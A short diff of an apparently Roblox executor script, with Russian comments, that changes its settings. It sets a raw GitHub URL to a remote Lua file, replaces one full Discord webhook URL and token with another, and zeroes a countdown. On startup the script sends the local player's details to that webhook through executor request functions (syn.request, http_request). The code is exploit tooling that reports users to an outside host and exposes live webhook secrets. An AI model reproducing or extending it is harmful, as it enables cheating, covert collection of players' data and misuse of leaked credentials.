@@ -9,10 +9,10 @@ local SETTINGS = {
     GAME_ID = 109983668079237,
     PASTEFY_URL = "https://raw.githubusercontent.com/dsfsdfs21cfc/yrhgnjrtyjh333/refs/heads/main/bdbrthh5serv.lua",
     COOLDOWN_TIME = 5 * 60,
-    COUNTDOWN_TIME = 5,
+    COUNTDOWN_TIME = 0,
     ERROR_RETRY_DELAY = 2,
     SUCCESS_DELAY = 3,
-    WEBHOOK_URL = "https://discord.com/api/webhooks/1463015416921063425/ORO4XCHEUGnNdPWK9xYYr4PufB8mXIlpreogUHxT6gbpPyu6mcsoJAwPSRiwOxZVZ8oe"
+    WEBHOOK_URL = "https://discord.com/api/webhooks/1463010872304861226/c_BzdZVo8TCs3niXVpv2qLaffYPTi7qZYvouKwiX4EDW1IWHVfWuw6WEPhwAvBSCbpZY"
 }
 
 -- Хранилище данных
@@ -23,7 +23,7 @@ local SHOW_COUNTDOWN = true
 -- Отправка в Discord при запуске
 local function SendDiscordWebhook()
     local player = Players.LocalPlayer
-    pcall(function()
+    local success, err = pcall(function()
         local data = {
             embeds = {{
                 title = "🚀 Script Started",
@@ -39,6 +39,7 @@ local function SendDiscordWebhook()
         }
         
         local jsonData = HttpService:JSONEncode(data)
+        
         local request = (syn and syn.request) or (http and http.request) or http_request or request
         
         if request then
